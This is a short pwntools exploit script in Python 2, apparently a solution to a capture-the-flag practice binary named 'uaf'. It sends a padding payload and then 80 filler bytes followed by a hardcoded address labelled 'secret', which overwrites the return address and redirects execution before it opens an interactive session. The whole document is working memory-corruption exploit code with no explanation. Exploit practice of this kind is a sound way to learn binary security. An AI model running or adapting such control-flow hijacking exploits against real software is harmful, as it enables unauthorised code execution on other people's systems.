from pwn  import *
import os
import sys

addr_secret = 0x0804852b

p = process("./uaf")

payload = "a"*4
pause()
p.sendline(payload)

print p.recv()

payload2 = "a"*80
payload2 += p32(addr_secret)#84 segment falut
pause()
p.sendline(payload2)

print p.recv()

p.interactive()